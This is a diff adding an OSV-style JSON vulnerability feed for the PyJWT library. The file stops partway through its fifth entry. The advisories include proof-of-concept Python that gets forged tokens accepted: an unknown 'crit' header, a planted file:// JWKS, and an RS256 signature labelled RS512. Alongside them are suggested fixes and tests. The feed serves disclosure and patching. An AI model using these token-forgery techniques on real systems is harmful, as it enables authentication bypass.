@@ -1,0 +1,1160 @@
+{
+  "vulns": [
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.11.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-752w-5fwx-jx9f/GHSA-752w-5fwx-jx9f.json"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.12.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "0.1.1",
+            "0.1.2",
+            "0.1.3",
+            "0.1.4",
+            "0.1.5",
+            "0.1.6",
+            "0.1.7",
+            "0.1.8",
+            "0.1.9",
+            "0.2.0",
+            "0.2.1",
+            "0.2.3",
+            "0.3.0",
+            "0.3.1",
+            "0.3.2",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.3.0",
+            "1.4.0",
+            "1.4.1",
+            "1.4.2",
+            "1.5.0",
+            "1.5.1",
+            "1.5.2",
+            "1.5.3",
+            "1.6.0",
+            "1.6.1",
+            "1.6.3",
+            "1.6.4",
+            "1.7.0",
+            "1.7.1",
+            "2.0.0",
+            "2.0.0a1",
+            "2.0.0a2",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-32597",
+        "PYSEC-2026-120"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-345",
+          "CWE-863"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-03-13T20:05:04Z",
+        "nvd_published_at": "2026-03-13T19:55:09Z",
+        "severity": "HIGH"
+      },
+      "details": "## Summary\n\nPyJWT does not validate the `crit` (Critical) Header Parameter defined in\nRFC 7515 §4.1.11. When a JWS token contains a `crit` array listing\nextensions that PyJWT does not understand, the library accepts the token\ninstead of rejecting it. This violates the **MUST** requirement in the RFC.\n\nThis is the same class of vulnerability as CVE-2025-59420 (Authlib),\nwhich received CVSS 7.5 (HIGH).\n\n---\n\n## RFC Requirement\n\nRFC 7515 §4.1.11:\n\n> The \"crit\" (Critical) Header Parameter indicates that extensions to this\n> specification and/or [JWA] are being used that **MUST** be understood and\n> processed. [...] If any of the listed extension Header Parameters are\n> **not understood and supported** by the recipient, then the **JWS is invalid**.\n\n---\n\n## Proof of Concept\n\n```python\nimport jwt  # PyJWT 2.8.0\nimport hmac, hashlib, base64, json\n\n# Construct token with unknown critical extension\nheader = {\"alg\": \"HS256\", \"crit\": [\"x-custom-policy\"], \"x-custom-policy\": \"require-mfa\"}\npayload = {\"sub\": \"attacker\", \"role\": \"admin\"}\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b\"=\").decode()\n\nh = b64url(json.dumps(header, separators=(\",\", \":\")).encode())\np = b64url(json.dumps(payload, separators=(\",\", \":\")).encode())\nsig = b64url(hmac.new(b\"secret\", f\"{h}.{p}\".encode(), hashlib.sha256).digest())\ntoken = f\"{h}.{p}.{sig}\"\n\n# Should REJECT — x-custom-policy is not understood by PyJWT\ntry:\n    result = jwt.decode(token, \"secret\", algorithms=[\"HS256\"])\n    print(f\"ACCEPTED: {result}\")\n    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}\nexcept Exception as e:\n    print(f\"REJECTED: {e}\")\n```\n\n**Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy`\n**Actual:** Token accepted, payload returned.\n\n### Comparison with RFC-compliant library\n\n```python\n# jwcrypto — correctly rejects\nfrom jwcrypto import jwt as jw_jwt, jwk\nkey = jwk.JWK(kty=\"oct\", k=b64url(b\"secret\"))\njw_jwt.JWT(jwt=token, key=key, algs=[\"HS256\"])\n# raises: InvalidJWSObject('Unknown critical header: \"x-custom-policy\"')\n```\n\n---\n\n## Impact\n\n- **Split-brain verification** in mixed-library deployments (e.g., API\n  gateway using jwcrypto rejects, backend using PyJWT accepts)\n- **Security policy bypass** when `crit` carries enforcement semantics\n  (MFA, token binding, scope restrictions)\n- **Token binding bypass** — RFC 7800 `cnf` (Proof-of-Possession) can be\n  silently ignored\n- See CVE-2025-59420 for full impact analysis\n\n---\n\n## Suggested Fix\n\nIn `jwt/api_jwt.py`, add validation in `_validate_headers()` or\n`decode()`:\n\n```python\n_SUPPORTED_CRIT = {\"b64\"}  # Add extensions PyJWT actually supports\n\ndef _validate_crit(self, headers: dict) -> None:\n    crit = headers.get(\"crit\")\n    if crit is None:\n        return\n    if not isinstance(crit, list) or len(crit) == 0:\n        raise InvalidTokenError(\"crit must be a non-empty array\")\n    for ext in crit:\n        if ext not in self._SUPPORTED_CRIT:\n            raise InvalidTokenError(f\"Unsupported critical extension: {ext}\")\n        if ext not in headers:\n            raise InvalidTokenError(f\"Critical extension {ext} not in header\")\n```\n\n---\n\n## CWE\n\n- CWE-345: Insufficient Verification of Data Authenticity\n- CWE-863: Incorrect Authorization\n\n## References\n\n- [RFC 7515 §4.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11)\n- [CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32)\n- [RFC 7800 — Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)",
+      "id": "GHSA-752w-5fwx-jx9f",
+      "modified": "2026-06-08T19:15:12.447890578Z",
+      "published": "2026-03-13T20:05:04Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32597"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-120.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2026/05/msg00008.html"
+        }
+      ],
+      "related": [
+        "CGA-77vp-4q83-qrv6"
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "PyJWT accepts unknown `crit` header extensions"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.12.1",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-993g-76c3-p5m4/GHSA-993g-76c3-p5m4.json"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.0.0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "2.0.0",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48522",
+        "PYSEC-2026-175"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-441",
+          "CWE-918"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T19:28:41Z",
+        "nvd_published_at": "2026-05-28T16:16:29Z",
+        "severity": "MODERATE"
+      },
+      "details": "> [!NOTE]\n> The library does not directly return non-HTTP(S) URI contents to the attacker; the chained \"plant a JWKS to forge tokens\" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.\n\n## Summary\n\nPyJWKClient passes its `uri` argument directly to `urllib.request.urlopen()` which uses Python stdlib's default `OpenerDirector` registering `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, **`FileHandler`**, and `DataHandler`. There is currently no documented option to restrict which schemes PyJWKClient will fetch.\n\nIf an application's `jku` URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:\n\n1. Cause PyJWKClient to read arbitrary local files via `file://` (SSRF on local filesystem) — the file's contents are passed to `json.load`.\n2. Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).\n3. **Forge tokens that PyJWT verifies as valid** — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and `jwt.decode()` accepts.\n\n## Affected versions\n\nTested and reproducible on **PyJWT 2.11.0 and 2.12.1**. Likely all versions back to PyJWKClient introduction.\n\n## Reproducer (full attack chain — verified empirically)\n\n```python\nimport jwt as pyjwt\nfrom jwt import PyJWKClient\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport json, base64, time\n\n# Attacker generates keypair (no relation to real IdP)\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub_n = key.public_key().public_numbers().n\n\ndef b64u(n):\n    bl = (n.bit_length() + 7) // 8\n    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()\n\n# Attacker writes JWK Set containing their public key to /tmp\njwks = {\"keys\":[{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"alg\":\"RS256\",\n                  \"n\":b64u(pub_n),\"e\":\"AQAB\"}]}\nwith open(\"/tmp/attacker.json\",\"w\") as f:\n    json.dump(jwks, f)\n\n# Attacker mints token signed with their private key, jku=file://\npriv_pem = key.private_bytes(serialization.Encoding.PEM,\n    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())\nnow = int(time.time())\ntoken = pyjwt.encode(\n    {\"sub\":\"attacker\",\"aud\":\"target-app\",\"iat\":now,\"exp\":now+3600},\n    priv_pem, algorithm=\"RS256\",\n    headers={\"kid\":\"attacker\",\"jku\":\"file:///tmp/attacker.json\",\"typ\":\"JWT\"})\n\n# Vulnerable application pattern: caller derives jku from token header\n# and passes to PyJWKClient without scheme validation\nheader = pyjwt.get_unverified_header(token)\nclient = PyJWKClient(header[\"jku\"])      # <-- accepts file:// silently\nkey_obj = client.get_signing_key_from_jwt(token)\ndecoded = pyjwt.decode(token, key_obj.key, algorithms=[\"RS256\"],\n                       audience=\"target-app\")\nprint(\"Token verified:\", decoded)\n# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}\n```\n\n## Cross-library evidence — PyJWT is the outlier\n\nThe same composition pattern is structurally safe in 4 other mainstream JWT libraries:\n\n| Library | Behavior on `jku=file://...` | Mechanism |\n|---|---|---|\n| **PyJWT 2.12.1** (Python) | **Reads file from disk, parses, uses for signature verification** | urllib default OpenerDirector includes FileHandler |\n| panva/jose 6.2.3 (Node.js) | Refuses pre-fetch | WHATWG `fetch()` rejects non-http(s) at fetch-spec layer |\n| golang-jwt + MicahParks/keyfunc v3.4.0 (Go) | Refuses pre-fetch | `http.DefaultTransport` only registers http/https |\n| Microsoft.IdentityModel.Tokens 8.18.0 (.NET) | Refuses pre-fetch | `HttpDocumentRetriever` defaults `RequireHttps=true` |\n| Spring Security NimbusJwtDecoder 6.3.4 (Java) | Refuses pre-fetch | URI parser delegation refuses non-http(s) at request build |\n\nPyJWT is the only library of these 5 where the default behavior allows `file://` to reach the fetch layer.\n\n## Recommended fix\n\nAdd `allowed_schemes: tuple[str, ...] = (\"https\", \"http\")` kwarg to `PyJWKClient.__init__`. Pre-validate URL scheme before invoking `urllib.request.urlopen`. URLs with disallowed schemes raise `PyJWKClientError` before any fetch is attempted.\n\n### Diff sketch against `jwt/jwks_client.py`\n\n```python\ndef __init__(\n    self, uri: str,\n    cache_keys: bool = False, max_cached_keys: int = 16,\n    cache_jwk_set: bool = True, lifespan: float = 300,\n    headers: dict[str, Any] | None = None, timeout: float = 30,\n    ssl_context: SSLContext | None = None,\n    allowed_schemes: tuple[str, ...] = (\"https\", \"http\"),  # NEW\n):\n    \"\"\"...\n    :param allowed_schemes: URL schemes the JWKS endpoint is permitted\n        to use. Default ``(\"https\", \"http\")``. Pass ``(\"https\",)`` for\n        HTTPS-only operation. URLs with disallowed schemes raise\n        ``PyJWKClientError`` before any fetch is attempted.\n    \"\"\"\n    # ... existing init code ...\n    self.allowed_schemes = allowed_schemes\n    self._validate_uri_scheme()\n\n\ndef _validate_uri_scheme(self) -> None:\n    \"\"\"Reject the configured URI early if its scheme isn't allowed.\"\"\"\n    from urllib.parse import urlparse\n    parsed = urlparse(self.uri)\n    scheme = parsed.scheme.lower()\n    if not scheme:\n        raise PyJWKClientError(\n            f\"PyJWKClient URI '{self.uri}' has no scheme; expected one of \"\n            f\"{self.allowed_schemes!r}\")\n    if scheme not in self.allowed_schemes:\n        raise PyJWKClientError(\n            f\"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes \"\n            f\"{self.allowed_schemes!r}; refusing to fetch from this URL\")\n```\n\n### Tests to add\n\n```python\ndef test_pyjwkclient_rejects_file_scheme():\n    with pytest.raises(PyJWKClientError, match=\"not in allowed_schemes\"):\n        PyJWKClient(\"file:///etc/passwd\")\n\ndef test_pyjwkclient_rejects_ftp_scheme():\n    with pytest.raises(PyJWKClientError):\n        PyJWKClient(\"ftp://example.org/keys.json\")\n\ndef test_pyjwkclient_rejects_data_scheme():\n    with pytest.raises(PyJWKClientError):\n        PyJWKClient('data:application/json,{\"keys\":[]}')\n\ndef test_pyjwkclient_caller_can_lock_to_https_only():\n    with pytest.raises(PyJWKClientError):\n        PyJWKClient(\"http://internal.test/jwks.json\", allowed_schemes=(\"https\",))\n```\n\n### Compatibility\n\n- Default `allowed_schemes=(\"https\", \"http\")` preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints\n- Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)\n- No changes to urllib fetch logic itself — the fix is a pre-validation gate\n\n## Class precedent\n\nThis is the same class as **CVE-2024-21643** (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.\n\n## Prior art (verified 2026-05-06)\n\nConfirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):\n\n- No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling\n- No existing GitHub issue or PR addressing scheme allowlisting\n- No silent fix in CHANGELOG through 2.12.1\n- 5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class\n\n## Credit\n\nReported by Keijo Tuominen — independent security research at CMHT.tech (https://cmht.tech).\n\nReproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.",
+      "id": "GHSA-993g-76c3-p5m4",
+      "modified": "2026-07-31T22:15:22.444788060Z",
+      "published": "2026-06-15T19:28:41Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48522"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/github/advisory-database/pull/8521"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml"
+        }
+      ],
+      "related": [
+        "CGA-93jp-w22w-gf62"
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.12.1",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-fhv5-28vv-h8m8/GHSA-fhv5-28vv-h8m8.json"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.0.0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "2.0.0",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48524",
+        "PYSEC-2026-177"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-460",
+          "CWE-755"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T17:28:46Z",
+        "nvd_published_at": "2026-05-28T16:16:29Z",
+        "severity": "LOW"
+      },
+      "details": "> [!NOTE]\n>  The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.\n\n## Summary\nPyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.\n\nAdditionally, fetch_data() finally block clears the JWKS cache on network error.\n\n## Root Cause\njwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown.\njwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.\n\n## Impact\n- DoS against JWKS endpoint (unlimited requests per invalid token)\n- DoS against application (network I/O latency)\n- Cascading failure (rate limiting clears cache, breaking legitimate auth)\n\n## Suggested Fix\n1. Add refresh cooldown (refuse refresh more than once per TTL period)\n2. Move cache write from finally to else block\n\n## Affected Versions\nAll versions with PyJWKClient (2.4.0 through 2.12.1)",
+      "id": "GHSA-fhv5-28vv-h8m8",
+      "modified": "2026-07-31T22:15:22.446184166Z",
+      "published": "2026-06-15T17:28:46Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48524"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/github/advisory-database/pull/8522"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-177.yaml"
+        }
+      ],
+      "related": [
+        "CGA-w6pf-m4gv-x48g"
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-jq35-7prp-9v3f/GHSA-jq35-7prp-9v3f.json"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.9.0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48523",
+        "PYSEC-2026-176"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-347"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T19:27:48Z",
+        "nvd_published_at": "2026-05-28T16:16:29Z",
+        "severity": "MODERATE"
+      },
+      "details": "> [!NOTE]\n> Scored assuming a deployment where algorithm policy functions as an authentication/authorization boundary. In deployments where the algorithm policy enforces crypto agility only, the practical confidentiality impact is lower and the issue is closer to an integrity-of-policy-enforcement bug.\n\nPyJWT `2.9.0` through `2.12.1` allows a verifier-side algorithm allow-list bypass when `jwt.decode()` or `jwt.decode_complete()` are called with a `PyJWK` key. The token header `alg` is checked against the caller-supplied `algorithms` allow-list, but signature verification is performed with the algorithm bound to the `PyJWK` object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented `PyJWKClient.get_signing_key_from_jwt(...)` flow.\n\n### Summary\n\nPyJWT's `PyJWK` verification path allows a verifier-side algorithm allow-list bypass.\n\nIn affected versions, when a JWT is decoded with a `PyJWK` object, PyJWT verifies that the header `alg` string is present in the caller's `algorithms=[...]` list, but it does not actually use the header algorithm to verify the signature. Instead, it verifies with the algorithm already bound to the `PyJWK` object.\n\nThis lets an attacker who controls a registered JWK/JWKS private key sign with a disallowed algorithm and have the token accepted as long as the JWT header advertises an allowed algorithm. This affects the documented `PyJWKClient` usage flow and does not require any non-default flags or unsafe configuration.\n\n### Details\n\nIn `jwt/api_jws.py` in `2.12.1`, `_verify_signature()` treats `PyJWK` keys differently from normal PEM/public-key inputs:\n\n```python\nif algorithms is None and isinstance(key, PyJWK):\n    algorithms = [key.algorithm_name]\n\n...\n\nif not alg or (algorithms is not None and alg not in algorithms):\n    raise InvalidAlgorithmError(\"The specified alg value is not allowed\")\n\nif isinstance(key, PyJWK):\n    alg_obj = key.Algorithm\n    prepared_key = key.key\nelse:\n    alg_obj = self.get_algorithm_by_name(alg)\n    prepared_key = alg_obj.prepare_key(key)\n```\n\nThis logic means:\n\n1. The JWT header `alg` is checked only as a string against the caller-supplied allow-list.\n2. If the key is a `PyJWK`, the actual verifier is not selected from the header algorithm.\n3. Instead, PyJWT always verifies with `key.Algorithm`, which is fixed when the `PyJWK` object is created.\n\n`PyJWK` binds its algorithm in `jwt/api_jwk.py` from the JWK's `alg` field or from key-type defaults:\n\n```python\nif not algorithm and isinstance(self._jwk_data, dict):\n    algorithm = self._jwk_data.get(\"alg\", None)\n\n...\n\nself.algorithm_name = algorithm\nself.Algorithm = get_default_algorithms()[algorithm]\nself.key = self.Algorithm.from_jwk(self._jwk_data)\n```\n\nSo once a `PyJWK` is constructed, the verifier uses the `PyJWK`'s bound algorithm, not the JWT header algorithm.\n\nThe issue is reachable through the documented JWKS flow. In `docs/usage.rst`, the project documents:\n\n```python\nsigning_key = jwks_client.get_signing_key_from_jwt(token)\njwt.decode(\n    token,\n    signing_key,\n    audience=\"https://expenses-api\",\n    options={\"verify_exp\": False},\n    algorithms=[\"RS256\"],\n)\n```\n\n`PyJWKClient.get_signing_key_from_jwt()` returns a `PyJWK`, so this documented path is affected.\n\nThis is not a \"no-key forgery\" issue. The attacker still needs control of an accepted JWK/JWKS private key. However, that is realistic in deployments such as:\n\n- self-service OAuth client assertions\n- multi-tenant key registration\n- federation / BYO-JWKS trust models\n- any system where external parties sign JWTs with their own registered keys\n\nIn those cases, the attacker can bypass verifier-side algorithm policy. For example, if the server intends to only accept `PS256`, an attacker controlling an accepted RSA JWK can sign with `RS256`, set `alg=PS256` in the JWT header, and still be accepted through the `PyJWK` path.\n\nThe same forged token is rejected through the normal PEM/public-key verification path, which shows the bug is specific to `PyJWK` verification rather than expected JWT behavior.\n\nThis behavior was introduced by commit `ab8176abe21e550dbc1c9a6bb7e78ad80853bfb1` (`Decode with PyJWK (#886)`), which is present in tagged releases `2.9.0`, `2.10.0`, `2.10.1`, `2.11.0`, `2.12.0`, and `2.12.1`.\n\n### PoC\n\nTested locally against PyJWT `2.12.1` on Python `3.12.10` with `cryptography 45.0.6`.\n\nInstall dependencies:\n\n```bash\npython -m pip install pyjwt==2.12.1 cryptography\n```\n\nRun the following script:\n\n```python\nimport json\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PublicFormat\nfrom jwt.api_jwk import PyJWK\nfrom jwt.algorithms import RSAAlgorithm\nfrom jwt.utils import base64url_encode\n\n# Generate an RSA keypair controlled by the attacker.\npriv = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub = priv.public_key()\npub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)\n\n# Build a PyJWK from the public key.\n# With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default.\njwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))\n\n# Create a token whose protected header claims RS512.\nheader = {\"typ\": \"JWT\", \"alg\": \"RS512\"}\npayload = {\"sub\": \"alice\"}\n\nheader_b64 = base64url_encode(\n    json.dumps(header, separators=(\",\", \":\"), sort_keys=True).encode()\n)\npayload_b64 = base64url_encode(\n    json.dumps(payload, separators=(\",\", \":\")).encode()\n)\nsigning_input = b\".\".join([header_b64, payload_b64])\n\n# Sign the RS512-labelled token with RS256 instead.\nsig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv)\ntoken = b\".\".join([header_b64, payload_b64, base64url_encode(sig)]).decode()\n\nprint(\"token:\", token)\nprint(\"PyJWK path:\")\nprint(jwt.decode(token, jwk, algorithms=[\"RS512\"]))\n\nprint(\"PEM path:\")\ntry:\n    print(jwt.decode(token, pub_pem, algorithms=[\"RS512\"]))\nexcept Exception as e:\n    print(f\"{type(e).__name__}: {e}\")\n```\n\nObserved output:\n\n```text\nPyJWK path:\n{'sub': 'alice'}\nPEM path:\nInvalidSignatureError: Signature verification failed\n```\n\nThe token is accepted when the verification key is a `PyJWK`, even though:\n\n- the caller restricted allowed algorithms to `[\"RS512\"]`\n- the signature was actually generated with `RS256`\n\nThe same token is rejected when verified through the normal PEM/public-key path.\n\n### Impact\n\nThis is an algorithm allow-list bypass affecting `jwt.decode()` and `jwt.decode_complete()` when the verification key is a `PyJWK`, including keys returned by `PyJWKClient`.\n\nThe impact depends on the deployment model:\n\n- If attackers cannot control any accepted JWK/JWKS private key, practical exploitability is limited.\n- If attackers can legitimately control a registered key, this is exploitable.\n\nImpacted deployments include:\n\n- JWT client assertion flows where each client uses its own key\n- multitenant systems where tenants register JWK/JWKS material\n- federation-style trust models\n- any application that relies on `algorithms=[...]` to enforce a crypto policy against externally controlled signing keys\n\nWhat an attacker can do:\n\n- bypass a server-side requirement such as \"only `PS256`\" or \"only `RS512`\"\n- continue using a deprecated or blocked algorithm after the server thought it had disabled it\n- authenticate successfully as their own client / tenant / federation principal even though they do not satisfy the configured algorithm policy\n\nWhat this issue does not do by itself:\n\n- it does not let an attacker forge tokens without access to a valid signing key or signing oracle\n- it does not automatically enable cross-tenant impersonation unless the surrounding application trust model adds another flaw",
+      "id": "GHSA-jq35-7prp-9v3f",
+      "modified": "2026-06-16T15:44:20.868973576Z",
+      "published": "2026-06-15T19:27:48Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48523"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-176.yaml"
+        }
+      ],
+      "related": [
+        "CGA-vrmj-m992-2qrx"
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "PyJWT: Algorithm allow-list bypass when decoding with `PyJWK` / `PyJWKClient` keys"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.12.1",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-w7vc-732c-9m39/GHSA-w7vc-732c-9m39.json"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.8.0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.8.0",
